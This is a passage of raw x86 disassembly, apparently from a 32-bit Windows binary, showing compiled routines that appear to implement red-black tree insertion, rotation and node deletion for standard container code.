   156c0:	mov    eax,DWORD PTR [esi+0x4]
   156c3:	push   DWORD PTR [eax+0x4]
   156c6:	mov    ecx,edi
   156c8:	call   0x11370
   156cd:	jmp    0x15722
   156cf:	mov    ecx,DWORD PTR [ecx]
   156d1:	cmp    DWORD PTR [ecx+0x68],edx
   156d4:	jne    0x156f3
   156d6:	mov    edx,eax
   156d8:	xor    eax,eax
   156da:	inc    eax
   156db:	mov    DWORD PTR [edx+0x68],eax
   156de:	mov    DWORD PTR [ecx+0x68],eax
   156e1:	mov    eax,DWORD PTR [esi+0x4]
   156e4:	mov    eax,DWORD PTR [eax+0x4]
   156e7:	and    DWORD PTR [eax+0x68],0x0
   156eb:	mov    eax,DWORD PTR [esi+0x4]
   156ee:	mov    esi,DWORD PTR [eax+0x4]
   156f1:	jmp    0x15722
   156f3:	cmp    esi,DWORD PTR [eax]
   156f5:	jne    0x15701
   156f7:	mov    esi,eax
   156f9:	push   esi
   156fa:	mov    ecx,edi
   156fc:	call   0x11370
   15701:	mov    eax,DWORD PTR [esi+0x4]
   15704:	mov    DWORD PTR [eax+0x68],0x1
   1570b:	mov    eax,DWORD PTR [esi+0x4]
   1570e:	mov    eax,DWORD PTR [eax+0x4]
   15711:	and    DWORD PTR [eax+0x68],0x0
   15715:	mov    eax,DWORD PTR [esi+0x4]
   15718:	push   DWORD PTR [eax+0x4]
   1571b:	mov    ecx,edi
   1571d:	call   0x11300
   15722:	mov    eax,DWORD PTR [edi+0x4]
   15725:	cmp    esi,DWORD PTR [eax+0x4]
   15728:	jne    0x15680
   1572e:	mov    eax,DWORD PTR [edi+0x4]
   15731:	mov    eax,DWORD PTR [eax+0x4]
   15734:	pop    edi
   15735:	mov    DWORD PTR [eax+0x68],0x1
   1573c:	mov    eax,DWORD PTR [ebp+0x8]
   1573f:	pop    esi
   15740:	mov    DWORD PTR [eax],ebx
   15742:	pop    ebx
   15743:	pop    ebp
   15744:	ret    0x10
   15747:	int3   
   15748:	int3   
   15749:	int3   
   1574a:	int3   
   1574b:	int3   
   1574c:	mov    edi,edi
   1574e:	push   ebp
   1574f:	mov    ebp,esp
   15751:	push   ebx
   15752:	push   esi
   15753:	mov    esi,DWORD PTR [ebp+0x10]
   15756:	push   edi
   15757:	push   0x0
   15759:	push   esi
   1575a:	mov    edi,ecx
   1575c:	call   0x139ec
   15761:	push   DWORD PTR [ebp+0x14]
   15764:	mov    ebx,eax
   15766:	mov    eax,ds:0x7f6d8
   1576b:	mov    DWORD PTR [ebx],eax
   1576d:	mov    eax,ds:0x7f6d8
   15772:	mov    DWORD PTR [ebx+0x8],eax
   15775:	lea    eax,[ebx+0xc]
   15778:	push   eax
   15779:	call   0x13b18
   1577e:	inc    DWORD PTR [edi+0xc]
   15781:	cmp    esi,DWORD PTR [edi+0x4]
   15784:	je     0x157ae
   15786:	mov    eax,DWORD PTR [ebp+0xc]
   15789:	cmp    eax,DWORD PTR ds:0x7f6d8
   1578f:	jne    0x157ae
   15791:	lea    eax,[esi+0xc]
   15794:	push   eax
   15795:	push   DWORD PTR [ebp+0x14]
   15798:	call   0x19804
   1579d:	test   al,al
   1579f:	jne    0x157ae
   157a1:	mov    DWORD PTR [esi+0x8],ebx
   157a4:	mov    eax,DWORD PTR [edi+0x4]
   157a7:	cmp    esi,DWORD PTR [eax+0x8]
   157aa:	jne    0x157c8
   157ac:	jmp    0x157bd
   157ae:	mov    DWORD PTR [esi],ebx
   157b0:	mov    eax,DWORD PTR [edi+0x4]
   157b3:	cmp    esi,eax
   157b5:	jne    0x157c2
   157b7:	mov    DWORD PTR [eax+0x4],ebx
   157ba:	mov    eax,DWORD PTR [edi+0x4]
   157bd:	mov    DWORD PTR [eax+0x8],ebx
   157c0:	jmp    0x157c8
   157c2:	cmp    esi,DWORD PTR [eax]
   157c4:	jne    0x157c8
   157c6:	mov    DWORD PTR [eax],ebx
   157c8:	mov    eax,DWORD PTR [edi+0x4]
   157cb:	mov    esi,ebx
   157cd:	cmp    ebx,DWORD PTR [eax+0x4]
   157d0:	je     0x15884
   157d6:	mov    eax,DWORD PTR [esi+0x4]
   157d9:	xor    edx,edx
   157db:	cmp    DWORD PTR [eax+0x1c],edx
   157de:	jne    0x15884
   157e4:	mov    ecx,DWORD PTR [eax+0x4]
   157e7:	cmp    eax,DWORD PTR [ecx]
   157e9:	jne    0x15825
   157eb:	mov    ecx,DWORD PTR [ecx+0x8]
   157ee:	cmp    DWORD PTR [ecx+0x1c],edx
   157f1:	je     0x1582c
   157f3:	cmp    esi,DWORD PTR [eax+0x8]
   157f6:	jne    0x15802
   157f8:	mov    esi,eax
   157fa:	push   esi
   157fb:	mov    ecx,edi
   157fd:	call   0x13160
   15802:	mov    eax,DWORD PTR [esi+0x4]
   15805:	mov    DWORD PTR [eax+0x1c],0x1
   1580c:	mov    eax,DWORD PTR [esi+0x4]
   1580f:	mov    eax,DWORD PTR [eax+0x4]
   15812:	and    DWORD PTR [eax+0x1c],0x0
   15816:	mov    eax,DWORD PTR [esi+0x4]
   15819:	push   DWORD PTR [eax+0x4]
   1581c:	mov    ecx,edi
   1581e:	call   0x131ae
   15823:	jmp    0x15878
   15825:	mov    ecx,DWORD PTR [ecx]
   15827:	cmp    DWORD PTR [ecx+0x1c],edx
   1582a:	jne    0x15849
   1582c:	mov    edx,eax
   1582e:	xor    eax,eax
   15830:	inc    eax
   15831:	mov    DWORD PTR [edx+0x1c],eax
   15834:	mov    DWORD PTR [ecx+0x1c],eax
   15837:	mov    eax,DWORD PTR [esi+0x4]
   1583a:	mov    eax,DWORD PTR [eax+0x4]
   1583d:	and    DWORD PTR [eax+0x1c],0x0
   15841:	mov    eax,DWORD PTR [esi+0x4]
   15844:	mov    esi,DWORD PTR [eax+0x4]
   15847:	jmp    0x15878
   15849:	cmp    esi,DWORD PTR [eax]
   1584b:	jne    0x15857
   1584d:	mov    esi,eax
   1584f:	push   esi
   15850:	mov    ecx,edi
   15852:	call   0x131ae
   15857:	mov    eax,DWORD PTR [esi+0x4]
   1585a:	mov    DWORD PTR [eax+0x1c],0x1
   15861:	mov    eax,DWORD PTR [esi+0x4]
   15864:	mov    eax,DWORD PTR [eax+0x4]
   15867:	and    DWORD PTR [eax+0x1c],0x0
   1586b:	mov    eax,DWORD PTR [esi+0x4]
   1586e:	push   DWORD PTR [eax+0x4]
   15871:	mov    ecx,edi
   15873:	call   0x13160
   15878:	mov    eax,DWORD PTR [edi+0x4]
   1587b:	cmp    esi,DWORD PTR [eax+0x4]
   1587e:	jne    0x157d6
   15884:	mov    eax,DWORD PTR [edi+0x4]
   15887:	mov    eax,DWORD PTR [eax+0x4]
   1588a:	pop    edi
   1588b:	mov    DWORD PTR [eax+0x1c],0x1
   15892:	mov    eax,DWORD PTR [ebp+0x8]
   15895:	pop    esi
   15896:	mov    DWORD PTR [eax],ebx
   15898:	pop    ebx
   15899:	pop    ebp
   1589a:	ret    0x10
   1589d:	int3   
   1589e:	int3   
   1589f:	int3   
   158a0:	int3   
   158a1:	int3   
   158a2:	mov    edi,edi
   158a4:	push   ebp
   158a5:	mov    ebp,esp
   158a7:	push   ecx
   158a8:	push   ecx
   158a9:	push   ebx
   158aa:	push   esi
   158ab:	mov    DWORD PTR [ebp-0x4],ecx
   158ae:	push   edi
   158af:	mov    edi,DWORD PTR [ebp+0xc]
   158b2:	lea    ecx,[ebp+0xc]
   158b5:	call   0x1157e
   158ba:	mov    esi,DWORD PTR [edi]
   158bc:	mov    eax,ds:0x7f6dc
   158c1:	mov    ebx,edi
   158c3:	mov    DWORD PTR [ebp-0x8],esi
   158c6:	cmp    esi,eax
   158c8:	jne    0x158e6
   158ca:	mov    esi,DWORD PTR [edi+0x8]
   158cd:	mov    eax,DWORD PTR [ebx+0x4]
   158d0:	mov    ecx,DWORD PTR [ebp-0x4]
   158d3:	mov    DWORD PTR [esi+0x4],eax
   158d6:	mov    eax,DWORD PTR [ecx+0x4]
   158d9:	cmp    DWORD PTR [eax+0x4],edi
   158dc:	jne    0x1595b
   158de:	mov    DWORD PTR [eax+0x4],esi
   158e1:	jmp    0x15969
   158e6:	mov    ecx,DWORD PTR [edi+0x8]
   158e9:	cmp    ecx,eax
   158eb:	je     0x158cd
   158ed:	push   ecx
   158ee:	call   0x114a6
   158f3:	mov    ebx,eax
   158f5:	mov    esi,DWORD PTR [ebx+0x8]
   158f8:	cmp    ebx,edi
   158fa:	je     0x158cd
   158fc:	mov    eax,DWORD PTR [ebp-0x8]
   158ff:	mov    DWORD PTR [eax+0x4],ebx
   15902:	mov    eax,DWORD PTR [edi]
   15904:	mov    DWORD PTR [ebx],eax
   15906:	cmp    ebx,DWORD PTR [edi+0x8]
   15909:	jne    0x15910
   1590b:	mov    DWORD PTR [esi+0x4],ebx
   1590e:	jmp    0x15927
   15910:	mov    eax,DWORD PTR [ebx+0x4]
   15913:	mov    DWORD PTR [esi+0x4],eax
   15916:	mov    eax,DWORD PTR [ebx+0x4]
   15919:	mov    DWORD PTR [eax],esi
   1591b:	mov    eax,DWORD PTR [edi+0x8]
   1591e:	mov    DWORD PTR [ebx+0x8],eax
   15921:	mov    eax,DWORD PTR [edi+0x8]
   15924:	mov    DWORD PTR [eax+0x4],ebx
   15927:	mov    eax,DWORD PTR [ebp-0x4]
   1592a:	mov    eax,DWORD PTR [eax+0x4]
   1592d:	cmp    DWORD PTR [eax+0x4],edi
   15930:	jne    0x15937
   15932:	mov    DWORD PTR [eax+0x4],ebx
   15935:	jmp    0x15945
   15937:	mov    eax,DWORD PTR [edi+0x4]
   1593a:	cmp    DWORD PTR [eax],edi
   1593c:	jne    0x15942
   1593e:	mov    DWORD PTR [eax],ebx
   15940:	jmp    0x15945
   15942:	mov    DWORD PTR [eax+0x8],ebx
   15945:	mov    eax,DWORD PTR [edi+0x4]
   15948:	mov    DWORD PTR [ebx+0x4],eax
   1594b:	mov    eax,DWORD PTR [ebx+0x14]
   1594e:	mov    ecx,DWORD PTR [edi+0x14]
   15951:	mov    DWORD PTR [ebx+0x14],ecx
   15954:	mov    DWORD PTR [edi+0x14],eax
   15957:	mov    ebx,edi
   15959:	jmp    0x159bc
   1595b:	mov    eax,DWORD PTR [edi+0x4]
   1595e:	cmp    DWORD PTR [eax],edi
   15960:	jne    0x15966
   15962:	mov    DWORD PTR [eax],esi
   15964:	jmp    0x15969
   15966:	mov    DWORD PTR [eax+0x8],esi
   15969:	mov    eax,DWORD PTR [ecx+0x4]
   1596c:	mov    DWORD PTR [ebp-0x8],eax
   1596f:	cmp    DWORD PTR [eax],edi
   15971:	jne    0x15993
   15973:	mov    edx,DWORD PTR [edi+0x8]
   15976:	cmp    edx,DWORD PTR ds:0x7f6dc
   1597c:	jne    0x15985
   1597e:	mov    edx,DWORD PTR [edi+0x4]
   15981:	mov    DWORD PTR [eax],edx
   15983:	jmp    0x15993
   15985:	push   esi
   15986:	call   0x114a6
   1598b:	mov    ecx,DWORD PTR [ebp-0x8]
   1598e:	mov    DWORD PTR [ecx],eax
   15990:	mov    ecx,DWORD PTR [ebp-0x4]
   15993:	mov    eax,DWORD PTR [ecx+0x4]
   15996:	mov    DWORD PTR [ebp-0x8],eax
   15999:	cmp    DWORD PTR [eax+0x8],edi
   1599c:	jne    0x159bc
   1599e:	mov    ecx,DWORD PTR [edi]
   159a0:	cmp    ecx,DWORD PTR ds:0x7f6dc
   159a6:	jne    0x159b0
   159a8:	mov    ecx,DWORD PTR [edi+0x4]
   159ab:	mov    DWORD PTR [eax+0x8],ecx
   159ae:	jmp    0x159bc
   159b0:	push   esi
   159b1:	call   0x11484
   159b6:	mov    ecx,DWORD PTR [ebp-0x8]
   159b9:	mov    DWORD PTR [ecx+0x8],eax
   159bc:	xor    edi,edi
   159be:	inc    edi
   159bf:	cmp    DWORD PTR [ebx+0x14],edi
   159c2:	jne    0x15ad9
   159c8:	jmp    0x15a87
   159cd:	cmp    DWORD PTR [esi+0x14],edi
   159d0:	jne    0x15ad6
   159d6:	mov    eax,DWORD PTR [esi+0x4]
   159d9:	cmp    esi,DWORD PTR [eax]
   159db:	jne    0x15a52
   159dd:	mov    eax,DWORD PTR [eax+0x8]
   159e0:	cmp    DWORD PTR [eax+0x14],0x0
   159e4:	jne    0x159fe
   159e6:	mov    DWORD PTR [eax+0x14],edi
   159e9:	mov    eax,DWORD PTR [esi+0x4]
   159ec:	and    DWORD PTR [eax+0x14],0x0
   159f0:	push   DWORD PTR [esi+0x4]
   159f3:	call   0x1323e
   159f8:	mov    eax,DWORD PTR [esi+0x4]
   159fb:	mov    eax,DWORD PTR [eax+0x8]
   159fe:	mov    ecx,DWORD PTR [eax]
   15a00:	cmp    DWORD PTR [ecx+0x14],edi
   15a03:	jne    0x15a0d
   15a05:	mov    ecx,DWORD PTR [eax+0x8]
   15a08:	cmp    DWORD PTR [ecx+0x14],edi
   15a0b:	je     0x15a80
   15a0d:	mov    ecx,DWORD PTR [eax+0x8]
   15a10:	cmp    DWORD PTR [ecx+0x14],edi
   15a13:	jne    0x15a2d
   15a15:	mov    ecx,DWORD PTR [eax]
   15a17:	mov    DWORD PTR [ecx+0x14],edi
   15a1a:	mov    ecx,DWORD PTR [ebp-0x4]
   15a1d:	and    DWORD PTR [eax+0x14],0x0
   15a21:	push   eax
   15a22:	call   0x1328c
   15a27:	mov    eax,DWORD PTR [esi+0x4]
   15a2a:	mov    eax,DWORD PTR [eax+0x8]
   15a2d:	mov    ecx,DWORD PTR [esi+0x4]
   15a30:	mov    ecx,DWORD PTR [ecx+0x14]
   15a33:	mov    DWORD PTR [eax+0x14],ecx
   15a36:	mov    ecx,DWORD PTR [esi+0x4]
   15a39:	mov    DWORD PTR [ecx+0x14],edi
   15a3c:	mov    eax,DWORD PTR [eax+0x8]
   15a3f:	mov    ecx,DWORD PTR [ebp-0x4]
   15a42:	mov    DWORD PTR [eax+0x14],edi
   15a45:	push   DWORD PTR [esi+0x4]
   15a48:	call   0x1323e
   15a4d:	jmp    0x15ad6
   15a52:	mov    eax,DWORD PTR [eax]
   15a54:	cmp    DWORD PTR [eax+0x14],0x0
   15a58:	jne    0x15a71
   15a5a:	mov    DWORD PTR [eax+0x14],edi
   15a5d:	mov    eax,DWORD PTR [esi+0x4]
   15a60:	and    DWORD PTR [eax+0x14],0x0
   15a64:	push   DWORD PTR [esi+0x4]
   15a67:	call   0x1328c
   15a6c:	mov    eax,DWORD PTR [esi+0x4]
   15a6f:	mov    eax,DWORD PTR [eax]
   15a71:	mov    ecx,DWORD PTR [eax+0x8]
   15a74:	cmp    DWORD PTR [ecx+0x14],edi
   15a77:	jne    0x15a98
   15a79:	mov    ecx,DWORD PTR [eax]
   15a7b:	cmp    DWORD PTR [ecx+0x14],edi
   15a7e:	jne    0x15a98
   15a80:	and    DWORD PTR [eax+0x14],0x0
   15a84:	mov    esi,DWORD PTR [esi+0x4]
   15a87:	mov    ecx,DWORD PTR [ebp-0x4]
   15a8a:	mov    eax,DWORD PTR [ecx+0x4]
   15a8d:	cmp    esi,DWORD PTR [eax+0x4]
   15a90:	jne    0x159cd
   15a96:	jmp    0x15ad6
   15a98:	mov    ecx,DWORD PTR [eax]
   15a9a:	cmp    DWORD PTR [ecx+0x14],edi
   15a9d:	jne    0x15ab7
   15a9f:	mov    ecx,DWORD PTR [eax+0x8]
   15aa2:	mov    DWORD PTR [ecx+0x14],edi
   15aa5:	mov    ecx,DWORD PTR [ebp-0x4]
   15aa8:	and    DWORD PTR [eax+0x14],0x0
   15aac:	push   eax
   15aad:	call   0x1323e
   15ab2:	mov    eax,DWORD PTR [esi+0x4]
   15ab5:	mov    eax,DWORD PTR [eax]
   15ab7:	mov    ecx,DWORD PTR [esi+0x4]
   15aba:	mov    ecx,DWORD PTR [ecx+0x14]
   15abd:	mov    DWORD PTR [eax+0x14],ecx
   15ac0:	mov    ecx,DWORD PTR [esi+0x4]
   15ac3:	mov    DWORD PTR [ecx+0x14],edi
   15ac6:	mov    eax,DWORD PTR [eax]
   15ac8:	mov    ecx,DWORD PTR [ebp-0x4]
   15acb:	mov    DWORD PTR [eax+0x14],edi
   15ace:	push   DWORD PTR [esi+0x4]
   15ad1:	call   0x1328c
   15ad6:	mov    DWORD PTR [esi+0x14],edi
   15ad9:	lea    eax,[ebx+0xc]
   15adc:	push   eax
   15add:	call   0x13b54
   15ae2:	push   ebx
   15ae3:	call   0x10a9a
   15ae8:	mov    eax,DWORD PTR [ebp-0x4]
   15aeb:	dec    DWORD PTR [eax+0xc]
   15aee:	mov    eax,DWORD PTR [ebp+0x8]
   15af1:	pop    ecx
   15af2:	mov    ecx,DWORD PTR [ebp+0xc]
   15af5:	pop    edi
   15af6:	pop    esi
   15af7:	mov    DWORD PTR [eax],ecx
   15af9:	pop    ebx
   15afa:	leave  
   15afb:	ret    0x8
   15afe:	int3   
   15aff:	int3   
   15b00:	int3   
   15b01:	int3   
   15b02:	int3   
   15b03:	int3   
   15b04:	mov    edi,edi
   15b06:	push   ebp
   15b07:	mov    ebp,esp
   15b09:	push   ebx
   15b0a:	push   esi
   15b0b:	push   edi
   15b0c:	mov    edi,DWORD PTR [ebp+0x8]
   15b0f:	mov    ebx,ecx
   15b11:	mov    esi,edi
   15b13:	cmp    edi,DWORD PTR ds:0x7f6dc
   15b19:	je     0x15b41
   15b1b:	push   DWORD PTR [esi+0x8]
   15b1e:	mov    ecx,ebx
   15b20:	call   0x15b04
   15b25:	mov    esi,DWORD PTR [esi]
   15b27:	lea    eax,[edi+0xc]
   15b2a:	push   eax
   15b2b:	call   0x13b54
   15b30:	push   edi
   15b31:	call   0x10a9a
   15b36:	pop    ecx
   15b37:	mov    edi,esi
   15b39:	cmp    esi,DWORD PTR ds:0x7f6dc
   15b3f:	jne    0x15b1b
   15b41:	pop    edi
   15b42:	pop    esi
   15b43:	pop    ebx
   15b44:	pop    ebp
   15b45:	ret    0x4
   15b48:	int3   
   15b49:	int3   
   15b4a:	int3   
   15b4b:	int3   
   15b4c:	int3   
   15b4d:	int3   
   15b4e:	mov    edi,edi
   15b50:	push   ebp
   15b51:	mov    ebp,esp
   15b53:	push   ebx
   15b54:	push   esi
   15b55:	mov    esi,DWORD PTR [ebp+0x10]
   15b58:	push   edi
   15b59:	push   0x0
   15b5b:	push   esi
   15b5c:	mov    edi,ecx
   15b5e:	call   0x1395c
   15b63:	push   DWORD PTR [ebp+0x14]
   15b66:	mov    ebx,eax
   15b68:	mov    eax,ds:0x7f6dc
   15b6d:	mov    DWORD PTR [ebx],eax
   15b6f:	mov    eax,ds:0x7f6dc
   15b74:	mov    DWORD PTR [ebx+0x8],eax
   15b77:	lea    eax,[ebx+0xc]
   15b7a:	push   eax
   15b7b:	call   0x13b36
   15b80:	inc    DWORD PTR [edi+0xc]
   15b83:	cmp    esi,DWORD PTR [edi+0x4]
   15b86:	je     0x15baa
   15b88:	mov    eax,DWORD PTR [ebp+0xc]
   15b8b:	cmp    eax,DWORD PTR ds:0x7f6dc
   15b91:	jne    0x15baa
   15b93:	mov    eax,DWORD PTR [ebp+0x14]
   15b96:	mov    eax,DWORD PTR [eax]
   15b98:	cmp    eax,DWORD PTR [esi+0xc]
   15b9b:	jl     0x15baa
   15b9d:	mov    DWORD PTR [esi+0x8],ebx
   15ba0:	mov    eax,DWORD PTR [edi+0x4]
   15ba3:	cmp    esi,DWORD PTR [eax+0x8]
   15ba6:	jne    0x15bc4
   15ba8:	jmp    0x15bb9
   15baa:	mov    DWORD PTR [esi],ebx
   15bac:	mov    eax,DWORD PTR [edi+0x4]
   15baf:	cmp    esi,eax
   15bb1:	jne    0x15bbe
   15bb3:	mov    DWORD PTR [eax+0x4],ebx
   15bb6:	mov    eax,DWORD PTR [edi+0x4]
   15bb9:	mov    DWORD PTR [eax+0x8],ebx
   15bbc:	jmp    0x15bc4
   15bbe:	cmp    esi,DWORD PTR [eax]
   15bc0:	jne    0x15bc4
   15bc2:	mov    DWORD PTR [eax],ebx
   15bc4:	mov    eax,DWORD PTR [edi+0x4]
   15bc7:	mov    esi,ebx
   15bc9:	cmp    ebx,DWORD PTR [eax+0x4]
   15bcc:	je     0x15c80
   15bd2:	mov    eax,DWORD PTR [esi+0x4]
   15bd5:	xor    edx,edx
   15bd7:	cmp    DWORD PTR [eax+0x14],edx
   15bda:	jne    0x15c80
   15be0:	mov    ecx,DWORD PTR [eax+0x4]
   15be3:	cmp    eax,DWORD PTR [ecx]
   15be5:	jne    0x15c21
   15be7:	mov    ecx,DWORD PTR [ecx+0x8]
   15bea:	cmp    DWORD PTR [ecx+0x14],edx
   15bed:	je     0x15c28
   15bef:	cmp    esi,DWORD PTR [eax+0x8]
   15bf2:	jne    0x15bfe
   15bf4:	mov    esi,eax
   15bf6:	push   esi
   15bf7:	mov    ecx,edi
   15bf9:	call   0x1323e
   15bfe:	mov    eax,DWORD PTR [esi+0x4]
   15c01:	mov    DWORD PTR [eax+0x14],0x1
   15c08:	mov    eax,DWORD PTR [esi+0x4]
   15c0b:	mov    eax,DWORD PTR [eax+0x4]
   15c0e:	and    DWORD PTR [eax+0x14],0x0
   15c12:	mov    eax,DWORD PTR [esi+0x4]
   15c15:	push   DWORD PTR [eax+0x4]
   15c18:	mov    ecx,edi
   15c1a:	call   0x1328c
   15c1f:	jmp    0x15c74
   15c21:	mov    ecx,DWORD PTR [ecx]
   15c23:	cmp    DWORD PTR [ecx+0x14],edx
   15c26:	jne    0x15c45
   15c28:	mov    edx,eax
   15c2a:	xor    eax,eax
   15c2c:	inc    eax
   15c2d:	mov    DWORD PTR [edx+0x14],eax
   15c30:	mov    DWORD PTR [ecx+0x14],eax
   15c33:	mov    eax,DWORD PTR [esi+0x4]
   15c36:	mov    eax,DWORD PTR [eax+0x4]
   15c39:	and    DWORD PTR [eax+0x14],0x0
   15c3d:	mov    eax,DWORD PTR [esi+0x4]
   15c40:	mov    esi,DWORD PTR [eax+0x4]
   15c43:	jmp    0x15c74
   15c45:	cmp    esi,DWORD PTR [eax]
   15c47:	jne    0x15c53
   15c49:	mov    esi,eax
   15c4b:	push   esi
   15c4c:	mov    ecx,edi
   15c4e:	call   0x1328c
   15c53:	mov    eax,DWORD PTR [esi+0x4]
   15c56:	mov    DWORD PTR [eax+0x14],0x1
   15c5d:	mov    eax,DWORD PTR [esi+0x4]
   15c60:	mov    eax,DWORD PTR [eax+0x4]
   15c63:	and    DWORD PTR [eax+0x14],0x0
   15c67:	mov    eax,DWORD PTR [esi+0x4]
   15c6a:	push   DWORD PTR [eax+0x4]
   15c6d:	mov    ecx,edi
   15c6f:	call   0x1323e
   15c74:	mov    eax,DWORD PTR [edi+0x4]
   15c77:	cmp    esi,DWORD PTR [eax+0x4]
   15c7a:	jne    0x15bd2
   15c80:	mov    eax,DWORD PTR [edi+0x4]
   15c83:	mov    eax,DWORD PTR [eax+0x4]
   15c86:	pop    edi
   15c87:	mov    DWORD PTR [eax+0x14],0x1
   15c8e:	mov    eax,DWORD PTR [ebp+0x8]
   15c91:	pop    esi
   15c92:	mov    DWORD PTR [eax],ebx
   15c94:	pop    ebx
   15c95:	pop    ebp
   15c96:	ret    0x10
   15c99:	int3   
   15c9a:	int3   
   15c9b:	int3   
   15c9c:	int3   
   15c9d:	int3   
   15c9e:	mov    edi,edi
   15ca0:	push   ebp
   15ca1:	mov    ebp,esp
   15ca3:	push   ebx
   15ca4:	push   esi
   15ca5:	mov    esi,DWORD PTR [ebp+0x10]
   15ca8:	push   edi
   15ca9:	push   0x0
   15cab:	push   esi
   15cac:	mov    edi,ecx
   15cae:	call   0x139ec
   15cb3:	push   DWORD PTR [ebp+0x14]
   15cb6:	mov    ebx,eax
   15cb8:	mov    eax,ds:0x7f6e4
   15cbd:	mov    DWORD PTR [ebx],eax
   15cbf:	mov    eax,ds:0x7f6e4
   15cc4:	mov    DWORD PTR [ebx+0x8],eax
   15cc7:	lea    eax,[ebx+0xc]
   15cca:	push   eax
   15ccb:	call   0x13b6c
   15cd0:	inc    DWORD PTR [edi+0xc]
   15cd3:	cmp    esi,DWORD PTR [edi+0x4]
   15cd6:	je     0x15d00
   15cd8:	mov    eax,DWORD PTR [ebp+0xc]
   15cdb:	cmp    eax,DWORD PTR ds:0x7f6e4
   15ce1:	jne    0x15d00
   15ce3:	lea    eax,[esi+0xc]
   15ce6:	push   eax
   15ce7:	push   DWORD PTR [ebp+0x14]
   15cea:	call   0x19834
   15cef:	test   al,al
   15cf1:	jne    0x15d00
   15cf3:	mov    DWORD PTR [esi+0x8],ebx
   15cf6:	mov    eax,DWORD PTR [edi+0x4]
   15cf9:	cmp    esi,DWORD PTR [eax+0x8]
   15cfc:	jne    0x15d1a
   15cfe:	jmp    0x15d0f
   15d00:	mov    DWORD PTR [esi],ebx
   15d02:	mov    eax,DWORD PTR [edi+0x4]
   15d05:	cmp    esi,eax
   15d07:	jne    0x15d14
   15d09:	mov    DWORD PTR [eax+0x4],ebx
   15d0c:	mov    eax,DWORD PTR [edi+0x4]
   15d0f:	mov    DWORD PTR [eax+0x8],ebx
   15d12:	jmp    0x15d1a
   15d14:	cmp    esi,DWORD PTR [eax]
   15d16:	jne    0x15d1a
   15d18:	mov    DWORD PTR [eax],ebx
   15d1a:	mov    eax,DWORD PTR [edi+0x4]
   15d1d:	mov    esi,ebx
   15d1f:	cmp    ebx,DWORD PTR [eax+0x4]
   15d22:	je     0x15dd6
   15d28:	mov    eax,DWORD PTR [esi+0x4]
   15d2b:	xor    edx,edx
   15d2d:	cmp    DWORD PTR [eax+0x1c],edx
   15d30:	jne    0x15dd6
   15d36:	mov    ecx,DWORD PTR [eax+0x4]
   15d39:	cmp    eax,DWORD PTR [ecx]
   15d3b:	jne    0x15d77
   15d3d:	mov    ecx,DWORD PTR [ecx+0x8]
   15d40:	cmp    DWORD PTR [ecx+0x1c],edx
   15d43:	je     0x15d7e
   15d45:	cmp    esi,DWORD PTR [eax+0x8]
   15d48:	jne    0x15d54
   15d4a:	mov    esi,eax
   15d4c:	push   esi
   15d4d:	mov    ecx,edi
   15d4f:	call   0x13354
   15d54:	mov    eax,DWORD PTR [esi+0x4]
   15d57:	mov    DWORD PTR [eax+0x1c],0x1
   15d5e:	mov    eax,DWORD PTR [esi+0x4]
   15d61:	mov    eax,DWORD PTR [eax+0x4]
   15d64:	and    DWORD PTR [eax+0x1c],0x0
   15d68:	mov    eax,DWORD PTR [esi+0x4]
   15d6b:	push   DWORD PTR [eax+0x4]
   15d6e:	mov    ecx,edi
   15d70:	call   0x133a2
   15d75:	jmp    0x15dca
   15d77:	mov    ecx,DWORD PTR [ecx]
   15d79:	cmp    DWORD PTR [ecx+0x1c],edx
   15d7c:	jne    0x15d9b
   15d7e:	mov    edx,eax
   15d80:	xor    eax,eax
   15d82:	inc    eax
   15d83:	mov    DWORD PTR [edx+0x1c],eax
   15d86:	mov    DWORD PTR [ecx+0x1c],eax
   15d89:	mov    eax,DWORD PTR [esi+0x4]
   15d8c:	mov    eax,DWORD PTR [eax+0x4]
   15d8f:	and    DWORD PTR [eax+0x1c],0x0
   15d93:	mov    eax,DWORD PTR [esi+0x4]
   15d96:	mov    esi,DWORD PTR [eax+0x4]
   15d99:	jmp    0x15dca
   15d9b:	cmp    esi,DWORD PTR [eax]
   15d9d:	jne    0x15da9
   15d9f:	mov    esi,eax
   15da1:	push   esi
   15da2:	mov    ecx,edi
   15da4:	call   0x133a2
   15da9:	mov    eax,DWORD PTR [esi+0x4]
   15dac:	mov    DWORD PTR [eax+0x1c],0x1
   15db3:	mov    eax,DWORD PTR [esi+0x4]
   15db6:	mov    eax,DWORD PTR [eax+0x4]
   15db9:	and    DWORD PTR [eax+0x1c],0x0
   15dbd:	mov    eax,DWORD PTR [esi+0x4]
   15dc0:	push   DWORD PTR [eax+0x4]
   15dc3:	mov    ecx,edi
   15dc5:	call   0x13354
   15dca:	mov    eax,DWORD PTR [edi+0x4]
   15dcd:	cmp    esi,DWORD PTR [eax+0x4]
   15dd0:	jne    0x15d28
   15dd6:	mov    eax,DWORD PTR [edi+0x4]
   15dd9:	mov    eax,DWORD PTR [eax+0x4]
   15ddc:	pop    edi
   15ddd:	mov    DWORD PTR [eax+0x1c],0x1
   15de4:	mov    eax,DWORD PTR [ebp+0x8]
   15de7:	pop    esi
   15de8:	mov    DWORD PTR [eax],ebx
   15dea:	pop    ebx
   15deb:	pop    ebp
   15dec:	ret    0x10
   15def:	int3   
   15df0:	int3   
   15df1:	int3   
   15df2:	int3   
   15df3:	int3   
   15df4:	mov    edi,edi
   15df6:	push   ebp
   15df7:	mov    ebp,esp
   15df9:	push   ecx
   15dfa:	push   DWORD PTR [ebp-0x4]
   15dfd:	push   DWORD PTR [ebp+0x10]
   15e00:	push   DWORD PTR [ebp+0xc]
   15e03:	push   DWORD PTR [ebp+0x8]
   15e06:	call   0x14bc4
   15e0b:	add    esp,0x10
   15e0e:	leave  
   15e0f:	ret    
   15e10:	int3   
   15e11:	int3   
   15e12:	int3   
   15e13:	int3   
   15e14:	int3   
   15e15:	int3   
   15e16:	mov    edi,edi
   15e18:	push   ebp
   15e19:	mov    ebp,esp
   15e1b:	push   esi
   15e1c:	push   edi
   15e1d:	mov    edi,DWORD PTR [ebp+0x8]
   15e20:	mov    al,BYTE PTR [edi+0x8]
   15e23:	mov    esi,ecx
   15e25:	mov    BYTE PTR [esi+0x8],al
   15e28:	call   0x144f0
   15e2d:	push   edi
   15e2e:	mov    ecx,esi
   15e30:	call   0x14b62
   15e35:	pop    edi
   15e36:	mov    eax,esi
   15e38:	pop    esi
   15e39:	pop    ebp
   15e3a:	ret    0x4
   15e3d:	int3   
   15e3e:	int3   
   15e3f:	int3   
   15e40:	int3   
   15e41:	int3   
   15e42:	mov    edi,edi
   15e44:	push   ebp
   15e45:	mov    ebp,esp
